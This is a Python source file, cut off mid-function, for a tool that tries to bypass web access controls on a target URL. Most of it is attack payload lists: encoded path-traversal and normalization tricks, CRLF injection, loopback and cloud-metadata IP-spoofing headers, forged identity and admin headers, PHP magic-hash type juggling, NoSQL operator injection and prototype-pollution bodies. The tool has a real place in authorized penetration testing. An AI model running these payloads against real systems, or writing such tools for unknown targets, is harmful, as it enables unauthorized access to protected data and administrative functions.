#!/usr/bin/env python3
#
# Advanced Access Control Bypass Testing Tool
# For AUTHORIZED security assessments only.
#
import requests
import argparse
import sys
import signal
import time
import json
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Set, Tuple
import threading
import re

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Signal Handler for immediate Ctrl+C exit
def signal_handler(sig, frame):
    print("\n\n[!] User interrupted. Shutting down cleanly...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


class UltimateBypasser:
    # Codes that are "interesting" relative to a blocked baseline (used by differential engine)
    INTERESTING_CODES = {200, 201, 202, 203, 204, 206, 301, 302, 303, 307, 308}
    BLOCKED_CODES = {401, 403, 405, 406, 407, 423, 429, 451}

    def __init__(self, target_url: str, custom_headers: List[str] = None, threads: int = 10,
                 timeout: int = 5, verbose: bool = False, proxy: str = None,
                 user_agent: str = None, delay: float = 0.0, deep: bool = False,
                 max_headers: int = 30, match_codes: Set[int] = None,
                 filter_codes: Set[int] = None, filter_lengths: Set[int] = None):
        self.parsed = urlparse(target_url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path if self.parsed.path else "/"
        self.methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
        self.successes = []
        self.session = requests.Session()
        self.session.verify = False
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.lock = threading.Lock()
        self.custom_headers = self._parse_custom_headers(custom_headers or [])
        self.tested_combinations = set()  # Track tested combinations to avoid duplicates

        # NEW: quality-of-life / effectiveness options
        self.delay = delay
        self.deep = deep  # run expensive header batteries against every path variation, not just canonical
        self.canonical_path = "/" + self.path.strip('/') if self.path.strip('/') else "/"
        self.baseline_status = None
        self.baseline_length = None
        # NEW: breadth + noise-control knobs
        self.max_headers = max_headers            # per-path single-header breadth (default preserves old behavior)
        self.match_codes = match_codes or set()   # if set, ONLY report hits with these status codes
        self.filter_codes = filter_codes or set() # drop hits with these status codes
        self.filter_lengths = filter_lengths or set()  # drop hits with these exact content lengths
        self.rate_limit_hits = 0                  # observed 429s (adaptive throttle + advice)

        # Performance optimization: reuse connections
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=threads,
            pool_maxsize=threads,
            max_retries=0
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

        # NEW: route everything through an intercepting proxy (e.g. Burp: http://127.0.0.1:8080)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        # NEW: set a global custom UA (overridden per-request by UA bypass tests)
        if user_agent:
            self.session.headers.update({"User-Agent": user_agent})

    def _parse_custom_headers(self, headers_list: List[str]) -> List[Dict[str, str]]:
        """Parse custom headers from command line format 'Key: Value'"""
        parsed = []
        for header in headers_list:
            if ':' in header:
                key, value = header.split(':', 1)
                parsed.append({key.strip(): value.strip()})
        return parsed

    def get_path_variations(self) -> List[str]:
        """Generates all recursive junction injections, version fuzzing, and encoding."""
        path_str = self.path.strip('/')
        segments = path_str.split('/') if path_str else []
        variations = set()

        full_path = "/" + path_str if path_str else "/"
        variations.add(full_path)

        # 1. API VERSION FUZZING
        version_payloads = ["v1", "v2", "v3", "v4", "v5", "v0", "v1.0", "v1.1", "v2.0", "api/v1", "api/v2", "api"]
        for i, seg in enumerate(segments):
            if any(x in seg.lower() for x in ['v1', 'v2', 'v3', 'v4', 'api']):
                for vp in version_payloads:
                    temp_segs = segments.copy()
                    temp_segs[i] = vp
                    variations.add("/" + "/".join(temp_segs))

        # 2. RECURSIVE JUNCTION INJECTION
        junction_payloads = [
            "..;/","/?/", "..;", ".;/", "./", "//", "/./", "/%2e/", "/%2e%2e/",
            "\\", "..\\", ".\\", "..\\/", "..;\\", "..%5c", "..%2f",
            "..%00/", "..%0d/", "..%5c..%5c", "/%2e%2e%3b/",
            "...//", "..../", ".../", "....//", "/...;/", "//..;/",
            "%2e%2e/", "%252e%252e/", "..%252f", "..%255c"
        ]
        for i in range(len(segments) + 1):
            for payload in junction_payloads:
                temp_segs = segments.copy()
                temp_segs.insert(i, payload)
                joined = ("/" + "/".join(temp_segs)).replace("//", "/")
                if joined != full_path:
                    variations.add(joined)

        # 3. CASE MUTATIONS
        if segments:
            # First char upper
            variations.add("/" + "/".join([seg[0].upper() + seg[1:] if seg else seg for seg in segments]))
            # All upper
            variations.add("/" + "/".join([seg.upper() for seg in segments]))
            # Alternating case
            variations.add("/" + "/".join([
                "".join([c.upper() if j % 2 == 0 else c.lower() for j, c in enumerate(seg)])
                for seg in segments
            ]))

        # 4. ENCODING VARIATIONS (optimized - only key positions)
        if len(full_path) > 1:
            # Encode first character after each /
            for i, char in enumerate(full_path):
                if i > 0 and full_path[i-1] == '/' and char != '/':
                    variations.add(full_path[:i] + f"%{ord(char):02x}" + full_path[i+1:])

            # Double encoding
            variations.add(full_path.replace('/', '%252f'))
            variations.add(full_path.replace('/', '%2f'))

            # Unicode encoding
            variations.add(full_path.replace('/', '%u002f'))
            variations.add(full_path.replace('/', '%uff0f'))  # Fullwidth solidus

            # Mixed encoding
            if len(full_path) > 3:
                variations.add(full_path[0] + "%2e" + full_path[2:])
                variations.add(full_path[0] + "%252e" + full_path[2:])

        # 5. QUERY PARAMETER BYPASSES (Enhanced)
        bypass_params = [
            # Auth/Admin bypasses
            "?debug=true", "?debug=1", "?admin=true", "?admin=1",
            "?is_admin=true", "?user=admin", "?verify=false", "?bypass=true",
            "?authenticated=true", "?auth=1", "?authorized=true",

            # Format/Output manipulation
            "?format=json", "?format=xml", "?format=yaml", "?format=raw",
            "?output=json", "?type=json", "?contentType=application/json",

            # Visibility/Access control
            "?public=true", "?is_public=true", "?public=1", "?is_public=1",
            "?private=false", "?internal=false", "?external=true",

            # Development/Testing flags
            "?trace=1", "?test=1", "?dev=1", "?internal=true", "?staging=1",
            "?env=dev", "?env=test", "?env=prod", "?mode=debug",

            # HTTP Method Override
            "?_method=GET", "?_method=POST", "?_method=PUT", "?_method=DELETE",
            "?method=GET", "?http_method=GET",

            # Role/Privilege escalation
            "?role=admin", "?privilege=admin", "?level=admin", "?access=admin",
            "?group=admin", "?type=admin", "?profile=admin",

            # IP/Source spoofing
            "?source=127.0.0.1", "?ip=127.0.0.1", "?local=true", "?localhost=1",
            "?from=127.0.0.1", "?origin=localhost",

            # JSONP/Callback
            "?callback=a", "?jsonp=a", "?cb=x",

            # Null byte injection
            "?id=1%00", "?user=admin%00", "?file=index%00",

            # Boolean logic bypasses
            "?override=true", "?force=true", "?skip=true", "?ignore=true",
            "?disabled=true", "?enabled=false", "?check=false",

            # Version/API keys
            "?v=1", "?version=1.0", "?api_version=v1", "?key=test",

            # Special parameters
            "?show_all=true", "?all=1", "?full=true", "?complete=true",
            "?limit=9999", "?offset=0", "?page=1",
        ]
        for param in bypass_params:
            variations.add(full_path + param)

        # 6. SUFFIX MUTATIONS (Enhanced)
        suffixes = [
            # Path manipulation
            "/", "//", "///", "/..;", "/..", "/.", "%00", "%20", "%09",
            "/;", "/;/", ";;", "?", "??", "#", "##",

            # File extensions
            ".json", ".xml", ".html", ".php", ".asp", ".aspx", ".jsp",
            ".txt", ".csv", ".yaml", ".yml", ".conf", ".config",

            # Backup/Special files
            "\\", ".bak", "~", ".old", ".orig", ".swp", ".tmp",
            ".1", ".2", ".backup", ".save", ".copy",

            # Special chars
            "%0a", "%0d", "%0d%0a", "%23", "%3f", "%26",
        ]
        for suffix in suffixes:
            variations.add(full_path + suffix)

        # 7. HTTP PARAMETER POLLUTION & SPECIAL INJECTIONS
        variations.add(full_path + "?id=1&id=2")
        variations.add(full_path + "?id[]=1&id[]=2")
        variations.add(full_path + "?[]")
        variations.add(full_path + "?param=value&param=")
        # PHP type-juggling delivered via query string (loose == / array coercion)
        for jp in ["?token=0e0", "?token=0e1234", "?auth=0e0", "?sig=0e0",
                   "?hash=0e0", "?password=0e0", "?admin=true", "?admin=1",
                   "?token[]=", "?password[]=", "?auth[]=", "?sig[]=x",
                   "?id=0e1", "?access=0e0"]:
            variations.add(full_path + jp)

        # 8. PATH NORMALIZATION EXPLOITS
        if segments:
            # Remove segments (simulating path traversal filtering)
            for i in range(len(segments)):
                temp_segs = segments.copy()
                temp_segs[i] = ""
                clean = "/".join([s for s in temp_segs if s])
                variations.add("/" + clean)

            # Duplicate segments
            for i in range(len(segments)):
                temp_segs = segments.copy()
                temp_segs.insert(i, segments[i])
                variations.add("/" + "/".join(temp_segs))

        # 9. PROTOCOL CONFUSION / REQUEST SMUGGLING PATTERNS
        variations.add(full_path + " HTTP/1.1")
        variations.add(full_path + "\r\n")
        variations.add(full_path + "\n")
        variations.add(full_path + "\r")

        # 10. UNICODE NORMALIZATION BYPASSES
        # Convert some chars to Unicode equivalents
        unicode_variants = []
        for char in full_path:
            if char == '/':
                unicode_variants.append('\u2044')  # Fraction slash
            elif char == '.':
                unicode_variants.append('\u2024')  # One dot leader
            else:
                unicode_variants.append(char)
        if unicode_variants:
            variations.add(''.join(unicode_variants))

        # 11. WILDCARD / GLOB PATTERNS
        variations.add(full_path + "/*")
        variations.add(full_path + "/**")
        if segments:
            variations.add("/" + "/".join(segments[:-1]) + "/*")

        # 12. CRLF INJECTION PATTERNS
        variations.add(full_path + "%0d%0aX-Ignore: true")
        variations.add(full_path + "%0aX-Forwarded-For: 127.0.0.1")

        # 13. NGINX/Apache specific bypasses
        variations.add(full_path + "/.")
        variations.add(full_path + "/.randomnonexistent")
        variations.add("/" + "/".join(segments) + "/$")

        # ==============================================================
        # ===============  NEW TECHNIQUES (ADDITIVE)  ==================
        # ==============================================================

        # 14. OVERLONG / MALFORMED UTF-8 ENCODING OF SEPARATORS
        # These decode to '/' or '.' inside lenient parsers (classic WAF/normalizer bypass).
        overlong_slash = ["%c0%af", "%e0%80%af", "%f0%80%80%af", "%c0%2f", "%c0%5c", "%uEFC8", "%25c0%25af"]
        overlong_dot   = ["%c0%ae", "%e0%80%ae", "%c0%2e", "%uFF0E"]
        for enc in overlong_slash:
            variations.add(full_path.replace('/', enc))
            if segments:
                variations.add("/" + enc.join(segments))
        for enc in overlong_dot:
            if '.' in full_path:
                variations.add(full_path.replace('.', enc))
        # traversal built from overlong encodings
        for enc_dot in ["%c0%ae%c0%ae", "..%c0%af", "..%c1%9c", "%c0%ae%c0%ae/", "..%e0%80%af"]:
            for i in range(len(segments) + 1):
                temp_segs = segments.copy()
                temp_segs.insert(i, enc_dot)
                variations.add(("/" + "/".join(temp_segs)))

        # 15. EXTENDED TRAVERSAL CHAINS (encoded + mixed slashes)
        traversal_chains = [
            "..%2f..%2f", "..%2f..%2f..%2f", "%2f..%2f..%2f",
            "..%5c..%5c", "..%5c..%5c..%5c", "%5c..%5c..%5c",
            "..%252f..%252f", "..%c0%af..%c0%af",
            ".%2e/", "%2e./", ".%2e%2f", "%2e%2e%5c",
            "....\\\\", "..;/..;/", "/..;/..;/",
        ]
        for chain in traversal_chains:
            variations.add(full_path.rstrip('/') + "/" + chain)
            variations.add("/" + chain + path_str)

        # 16. MATRIX / SEMICOLON PATH PARAMETERS (Tomcat/Jetty/Spring path-param confusion)
        matrix_params = [";", ";/", "/;", ";foo=bar", ";jsessionid=x", ";%2f", "/.;/", "/;x=1/",
                         "/..;/", "/;admin=true"]
        for mp in matrix_params:
            variations.add(full_path.rstrip('/') + mp)
            if segments:
                # inject the matrix param onto the last segment specifically
                variations.add("/" + "/".join(segments[:-1] + [segments[-1] + mp]))

        # 17. LAST-SEGMENT-ONLY CASE MUTATION
        # Many WAF rules match the final path component case-sensitively while the app is case-insensitive.
        if segments:
            last = segments[-1]
            head = segments[:-1]
            for mut in [last.upper(), last.capitalize(), last.swapcase(),
                        last + "%20", last + "%09", last + "..;", "%20" + last]:
                variations.add("/" + "/".join(head + [mut]))

        # 18. NULL / CONTROL-CHAR INJECTION INSIDE THE PATH
        control_injections = ["%00", "%0d", "%0a", "%09", "%0c", "%0b", "%20", "%ff", "%2500"]
        if segments:
            last = segments[-1]
            head = segments[:-1]
            for ci in control_injections:
                variations.add("/" + "/".join(head + [last + ci]))
                variations.add("/" + "/".join(head + [ci + last]))
                # split the last segment in half with the injection
                if len(last) > 1:
                    mid = len(last) // 2
                    variations.add("/" + "/".join(head + [last[:mid] + ci + last[mid:]]))

        # 19. DOUBLE / TRIPLE URL-ENCODING OF THE WHOLE PATH
        if len(full_path) > 1:
            dbl = "".join(f"%25{ord(c):02x}" if c not in "/" else c for c in full_path)
            variations.add(dbl)
            variations.add(full_path.replace('/', '%252f').replace('.', '%252e'))

        # 20. LEADING / TRAILING & EMBEDDED WHITESPACE VARIANTS
        variations.add(full_path + "/")
        variations.add("/%09" + path_str)
        variations.add("/%20" + path_str)
        variations.add("/ " + path_str)
        variations.add(full_path + " ")

        return list(variations)

    # ------------------------------------------------------------------
    # NEW: loopback / internal representations for IP-spoofing headers.
    # Naive string checks (== "127.0.0.1", regex ^127\.) fall to these,
    # and normalizing checks (ipaddress.is_loopback) fall to the numeric forms.
    # ------------------------------------------------------------------
    def get_localhost_variations(self) -> List[str]:
        return [
            "127.0.0.1", "127.0.0.2", "127.1", "127.0.1", "127.00.00.01",
            "127.000.000.001", "0", "0.0.0.0", "0000.0000.0000.0000",
            "127.0.0.1.",                 # trailing dot
            "0x7f.0x0.0x0.0x1",           # hex octets
            "0x7f000001",                 # 32-bit hex
            "2130706433",                 # 32-bit decimal
            "017700000001",               # 32-bit octal
            "0177.0.0.1",                 # octal first octet
            "127.0.0.1:80", "127.0.0.1:443",
            "[::1]", "[::ffff:127.0.0.1]", "::1", "0:0:0:0:0:0:0:1",
            "localhost", "localhost.localdomain",
            # trusted-internal ranges
            "10.0.0.1", "172.16.0.1", "192.168.0.1", "100.64.0.1",
            # cloud metadata endpoint (sometimes implicitly trusted)
            "169.254.169.254",
            # parser-confusion payloads
            "127.0.0.1%00", "127.0.0.1 ", "127.0.0.1\t", "127.0.0.1#",
            "127.0.0.1@localhost", "localhost@127.0.0.1",
        ]

    def get_extended_ip_headers(self) -> List[Dict[str, str]]:
        """Cross-product of every IP-spoof header with every loopback representation."""
        ip_header_names = [
            "X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Remote-IP",
            "X-Remote-Addr", "X-Originating-IP", "True-Client-IP",
            "CF-Connecting-IP", "Fastly-Client-IP", "X-Custom-IP-Authorization",
            "X-Forwarded", "Forwarded-For", "X-Forward-For", "Client-IP",
        ]
        out = []
        for ip in self.get_localhost_variations():
            for name in ip_header_names:
                out.append({name: ip})
        return out

    # ------------------------------------------------------------------
    # NEW: User-Agent based bypasses. Health-check / bot UAs are commonly
    # allow-listed at the edge or in application middleware.
    # ------------------------------------------------------------------
    def get_user_agent_headers(self) -> List[Dict[str, str]]:
        uas = [
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
            "facebookexternalhit/1.1", "Slackbot-LinkExpanding 1.0", "Twitterbot/1.0",
            "curl/8.0.0", "Wget/1.21", "PostmanRuntime/7.36.0", "python-requests/2.31.0",
            "", "-", "null",
            # internal / infra probes that are frequently whitelisted
            "kube-probe/1.28", "ELB-HealthChecker/2.0", "GoogleHC/1.0",
            "Amazon CloudFront", "Consul Health Check", "Datadog Agent/7.0",
            "Pingdom.com_bot_version_1.4", "UptimeRobot/2.0", "StatusCake",
            "Prometheus/2.0", "nagios-plugins/2.3", "check_http/v2.3",
        ]
        return [{"User-Agent": ua} for ua in uas]

    # ------------------------------------------------------------------
    # NEW: Cookie flag bypasses. Cheap trust flags in session cookies.
    # ------------------------------------------------------------------
    def get_cookie_headers(self) -> List[Dict[str, str]]:
        cookies = [
            "admin=true", "isAdmin=true", "is_admin=1", "role=admin",
            "authenticated=true", "auth=1", "authorized=true", "loggedin=true",
            "logged_in=1", "user=admin", "username=admin", "session=admin",
            "access=granted", "bypass=1", "debug=true", "internal=true",
            "privilege=admin", "level=99", "superuser=1",
        ]
        return [{"Cookie": c} for c in cookies]

    # ------------------------------------------------------------------
    # NEW: PHP type-juggling via Cookie / token.
    # Targets PHP loose comparison, e.g.:
    #     if ($_COOKIE['token'] == $secret) { ... }          -> 0e[digits] == 0e[digits] is TRUE
    #     if (md5($_COOKIE['x']) == $stored_magic_hash) {...} -> send a known preimage
    #     if (strcmp($_COOKIE['x'], $secret) == 0) { ... }   -> send x[]= (array -> NULL == 0)
    # Example the user asked for:  Cookie: PHPSESSID=0e1234
    # ------------------------------------------------------------------
    def get_php_juggling_headers(self) -> List[Dict[str, str]]:
        # Cookie/token names apps commonly compare with loose ==
        names = [
            "PHPSESSID", "auth", "auth_token", "token", "session", "sess",
            "hash", "sig", "signature", "csrf", "csrf_token", "password",
            "pass", "key", "api_key", "secret", "remember", "remember_token",
            "admin", "user", "role", "access_token", "jwt",
        ]
        # 0e[digits] values collapse to 0 under PHP loose == (magic-hash style)
        magic_values = [
            "0e1234", "0e1234567890", "0e0",
            "0e00000000000000000000000000000000",
            "0e462097431906509019562988736854",           # md5("240610708")
            "0e830400451993494058024219903391",           # md5("QNKCDZO")
            "0e087386482136013740957780965295",           # md5("aabg7XSs")
            "0e07766915004133176347055865026311692244",   # sha1("10932435112")
        ]
        # Known preimages: hash(value) itself becomes a 0e magic hash
        preimage_values = ["240610708", "QNKCDZO", "aabg7XSs", "10932435112", "0", "0.0"]
        # Loose truthy / zero coercions
        loose_values = ["1", "true", "", "null", "00", "0x0"]

        out = []
        for name in names:
            for val in magic_values + preimage_values + loose_values:
                out.append({"Cookie": f"{name}={val}"})
            # PHP array injection on the cookie name -> $_COOKIE[name] becomes an array
            out.append({"Cookie": f"{name}[]=1"})
            out.append({"Cookie": f"{name}[]="})
        return out

    def get_headers(self) -> List[Dict[str, str]]:
        """Enhanced header bypass matrix"""
        base_headers = [
            # IP Spoofing Headers
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "localhost"},
            {"X-Forwarded-For": "::1"},
            {"X-Forwarded-For": "0.0.0.0"},
            {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1:80"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"X-Client-Ip": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},  # Cloudflare
            {"Fastly-Client-IP": "127.0.0.1"},  # Fastly CDN
            {"X-Cluster-Client-IP": "127.0.0.1"},
            {"WL-Proxy-Client-IP": "127.0.0.1"},
            {"Proxy-Client-IP": "127.0.0.1"},

            # URL/Path Rewriting
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Original-Uri": self.path},
            {"X-Forwarded-Prefix": self.path},
            {"X-Forwarded-Path": self.path},

            # Host Headers
            {"Host": "localhost"},
            {"Host": "127.0.0.1"},
            {"X-Forwarded-Server": "localhost"},
            {"X-Forwarded-Host": "localhost:80"},

            # Protocol/Scheme manipulation
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Protocol": "https"},
            {"X-Url-Scheme": "https"},
            {"X-Scheme": "https"},
            {"Front-End-Https": "on"},

            # HTTP Method Override
            {"X-Original-Method": "GET"},
            {"X-HTTP-Method": "GET"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"_method": "PUT"},

            # Authentication/Authorization Bypass
            {"X-Authenticated-User": "admin"},
            {"X-User": "admin"},
            {"X-Username": "admin"},
            {"X-User-Id": "1"},
            {"X-Role": "admin"},
            {"X-Privilege": "admin"},
            {"X-Auth-User": "admin"},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"X-Api-Key": "test"},

            # Content Type Manipulation
            {"Content-Type": "application/json"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Content-Type": "text/xml"},
            {"Content-Type": "application/xml"},
            {"Accept": "*/*"},
            {"Accept": "application/json"},

            # AJAX/API Indicators
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Requested-By": "XMLHttpRequest"},
            {"X-AJAX": "true"},

            # Referrer/Origin
            {"Referer": self.base_url + self.path},
            {"Referer": "http://localhost"},
            {"Referer": "http://127.0.0.1"},
            {"Origin": self.base_url},
            {"Origin": "http://localhost"},
            {"Origin": "null"},

            # Custom/Proprietary Headers
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-By": "127.0.0.1"},
            {"X-Forwarded-From": "127.0.0.1"},
            {"X-Gateway": "internal"},
            {"X-Debug": "true"},
            {"X-Debug-Mode": "1"},
            {"X-Test": "true"},
            {"X-Internal": "true"},

            # Cache Poisoning / CDN Bypass
            {"X-Cache-Key": "bypass"},
            {"X-Cache-Status": "bypass"},
            {"Pragma": "no-cache"},
            {"Cache-Control": "no-cache"},
            {"X-No-Cache": "true"},

            # Range Request Bypass
            {"Range": "bytes=0-1"},
            {"Range": "bytes=0-0"},

            # Proxy/Load Balancer specific
            {"Via": "1.1 localhost"},
            {"Max-Forwards": "0"},
            {"Forwarded": "for=127.0.0.1;host=localhost;proto=https"},

            # WebSocket upgrade attempt
            {"Upgrade": "websocket"},
            {"Connection": "Upgrade"},

            # Custom header injections
            {"X-Forwarded-Port": "443"},
            {"X-Forwarded-SSL": "on"},
            {"X-Frame-Options": "ALLOWALL"},

            # ==========================================================
            # ==============  NEW HEADERS (ADDITIVE)  ==================
            # ==========================================================

            # Nginx / Apache internal-redirect headers — if the app reflects
            # these into an internal subrequest you can reach protected roots.
            {"X-Accel-Redirect": self.path},
            {"X-Sendfile": self.path},
            {"X-LIGHTTPD-send-file": self.path},

            # Additional URL-rewrite header names seen across stacks
            {"Base-Url": self.path},
            {"Http-Url": self.path},
            {"Proxy-Url": self.path},
            {"Request-Uri": self.path},
            {"Uri": self.path},
            {"X-Uri": self.path},
            {"X-Override-Url": self.path},
            {"X-Original-Path": self.path},
            {"X-Forwarded-Uri": self.path},
            {"X-Rewrite-Uri": self.path},
            {"X-HTTP-DestinationURL": self.path},
            {"Destination": self.path},

            # XFF typo / alternate variants that specific frameworks parse
            {"X-Forward-For": "127.0.0.1"},
            {"X-Forwarded": "for=127.0.0.1"},
            {"Forwarded-For": "127.0.0.1"},
            {"Forwarded-For-Ip": "127.0.0.1"},
            {"X-Forwarded-For-Original": "127.0.0.1"},
            {"X-True-IP": "127.0.0.1"},
            {"Ip": "127.0.0.1"},
            {"X-Original-Forwarded-For": "127.0.0.1"},

            # Cloud metadata as the source
            {"X-Forwarded-For": "169.254.169.254"},

            # Extra scheme/SSL hints
            {"X-Forwarded-Scheme": "https"},
            {"X-Forwarded-Ssl": "on"},
            {"X-ARR-SSL": "on"},                 # IIS ARR
            {"X-ARR-LOG-ID": "1"},

            # Feature / profile flags observed in the wild
            {"X-Profile": "admin"},
            {"Profile": "admin"},
            {"X-Feature-Flags": "admin"},
            {"X-Env": "dev"},
            {"X-Environment": "development"},

            # Method override alternates
            {"X-HTTP-Method-Override": "HEAD"},
            {"X-HTTP-Method-Override": "PATCH"},
            {"X-Method": "GET"},

            # Body-length trick for method-restricted endpoints
            {"Content-Length": "0"},

            # CDN-specific hints
            {"Akamai-Origin-Hop": "1"},
            {"CDN-Loop": "none"},
            {"X-Amz-Cf-Id": "bypass"},
            {"X-Vercel-Ip-Country": "US"},

            # Token/identity assertion headers used by some gateways
            {"X-Forwarded-User": "admin"},
            {"X-Forwarded-Groups": "admin"},
            {"X-Auth-Request-User": "admin"},
            {"X-Auth-Request-Email": "admin@localhost"},
            {"X-Remote-User": "admin"},
            {"X-WEBAUTH-USER": "admin"},
            {"Remote-User": "admin"},
            {"X-SSL-Client-Verify": "SUCCESS"},   # mTLS-terminating proxies
            {"X-SSL-Client-S-DN": "CN=admin"},
        ]

        # Add custom headers
        if self.custom_headers:
            base_headers.extend(self.custom_headers)

        return base_headers

    def get_header_combinations(self) -> List[Dict[str, str]]:
        """Generate powerful multi-header combinations for advanced bypasses"""
        combinations = [
            # IP Spoofing combinations
            {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1"
            },
            {
                "X-Forwarded-For": "localhost",
                "X-Forwarded-Host": "localhost",
                "X-Forwarded-Proto": "https"
            },
            # Path rewrite + IP spoof
            {
                "X-Original-URL": self.path,
                "X-Forwarded-For": "127.0.0.1"
            },
            # Method override + Auth
            {
                "X-HTTP-Method-Override": "GET",
                "X-Authenticated-User": "admin"
            },
            # Full internal request simulation
            {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Forwarded-Proto": "https",
                "X-Forwarded-Host": "localhost"
            },
            # CDN/Proxy bypass
            {
                "CF-Connecting-IP": "127.0.0.1",
                "True-Client-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1"
            },
            # Admin simulation
            {
                "X-User": "admin",
                "X-Role": "admin",
                "X-Privilege": "admin"
            },
            # Debug mode activation
            {
                "X-Debug": "true",
                "X-Test": "true",
                "X-Internal": "true"
            },

            # ==========================================================
            # ============  NEW COMBINATIONS (ADDITIVE)  ===============
            # ==========================================================

            # Full loopback saturation across every common IP header at once
            {
                "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1", "X-Originating-IP": "127.0.0.1",
                "True-Client-IP": "127.0.0.1", "CF-Connecting-IP": "127.0.0.1",
                "Client-IP": "127.0.0.1", "X-Host": "127.0.0.1",
            },
            # Reverse-proxy identity assertion (oauth2-proxy / SSO style)
            {
                "X-Forwarded-User": "admin", "X-Auth-Request-User": "admin",
                "X-Remote-User": "admin", "Remote-User": "admin",
                "X-Forwarded-Groups": "admin",
            },
            # mTLS-terminating gateway spoof
            {
                "X-SSL-Client-Verify": "SUCCESS", "X-SSL-Client-S-DN": "CN=admin",
                "X-Forwarded-Proto": "https", "X-Forwarded-For": "127.0.0.1",
            },
            # URL-rewrite family fired together (whichever the stack honors wins)
            {
                "X-Original-URL": self.path, "X-Rewrite-URL": self.path,
                "X-Original-Uri": self.path, "Request-Uri": self.path,
            },
            # Internal-redirect family
            {
                "X-Accel-Redirect": self.path, "X-Sendfile": self.path,
            },
            # Metadata-origin + scheme
            {
                "X-Forwarded-For": "169.254.169.254", "X-Forwarded-Proto": "https",
                "X-Forwarded-Host": "metadata.google.internal",
            },
            # Method override + full internal identity
            {
                "X-HTTP-Method-Override": "GET", "X-Forwarded-For": "127.0.0.1",
                "X-Original-URL": self.path, "X-Remote-User": "admin",
            },
        ]

        return combinations

    def get_bypass_payloads(self) -> List[Dict]:
        """Generate body payloads for POST/PUT/PATCH requests"""
        return [
            # JSON payloads
            {"admin": True},
            {"is_admin": True},
            {"role": "admin"},
            {"privilege": "admin"},
            {"authenticated": True},
            {"bypass": True},
            {"debug": True},
            {"test": True},
            {"internal": True},
            {"user": "admin"},
            {"username": "admin"},
            {"_method": "GET"},
            {"__method": "GET"},

            # Parameter pollution
            {"id": [1, 2]},
            {"user": ["admin", "user"]},

            # Null/undefined injection
            {"validate": None},
            {"check": None},
            {"verify": False},

            # Boolean bypasses
            {"public": True},
            {"private": False},
            {"disabled": True},
            {"enabled": False},

            # ==============================================================
            # ================  NEW BODY PAYLOADS (ADDITIVE)  ==============
            # ==============================================================
            {"authorized": True},
            {"access": "granted"},
            {"permission": "admin"},
            {"level": 99},
            {"superuser": True},
            {"is_staff": True},
            {"is_superuser": True},
            {"scope": "admin"},
            {"grant_type": "admin"},
            {"override": True},
            {"force": True},
            {"skip_auth": True},
            {"skip_validation": True},
            {"__proto__": {"admin": True}},          # prototype pollution probe (Node)
            {"constructor": {"prototype": {"admin": True}}},
            {"role": ["admin", "user"]},
            {"roles": ["admin"]},
            {"groups": ["admin"]},
            {"_method": "PUT"},
            {"_method": "DELETE"},

            # PHP type-juggling in JSON bodies (loose == against a 0e magic secret,
            # or array-vs-string comparisons that coerce to true/NULL).
            {"token": "0e0"},
            {"token": "0e1234567890"},
            {"auth": "0e0"},
            {"signature": "0e0"},
            {"sig": "0e0"},
            {"hash": "0e0"},
            {"password": "0e0"},
            {"password": []},            # strcmp(array, str) / loose compare quirk
            {"token": []},
            {"secret": []},
            {"admin": "0e0"},
            {"authenticated": "0e0"},
            {"token": ["0e0"]},
            {"password": {"$ne": None}},  # bonus: NoSQL operator injection probe
            {"password": {"$gt": ""}},
            {"username": {"$ne": None}},
        ]

    # ------------------------------------------------------------------
    # NEW: establish a fingerprint of the blocked response so we can flag
    # *differential* bypasses (redirects, length changes) not just 2xx.
    # ------------------------------------------------------------------
    def establish_baseline(self):
        try:
            r = self.session.get(self.base_url + self.canonical_path,
                                 timeout=self.timeout, allow_redirects=False)
            self.baseline_status = r.status_code
            self.baseline_length = len(r.content)
            print(f"[*] Baseline (untouched request): {self.baseline_status} | Length: {self.baseline_length}")
        except requests.exceptions.RequestException:
